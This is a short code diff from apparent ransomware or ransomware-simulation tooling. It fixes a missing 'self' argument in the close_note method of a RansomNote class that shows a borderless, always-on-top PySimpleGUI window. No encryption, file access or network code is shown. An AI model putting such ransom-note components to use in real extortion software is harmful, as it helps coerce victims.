@@ -25,7 +25,7 @@ class RansomNote(object):
         window = sg.Window('Title', layout, no_titlebar=True, keep_on_top=True, element_justification='c')
         self.note = window 
     
-    def close_note():
+    def close_note(self):
         self.note.close()
 
 def purple_pop_up(text=str):
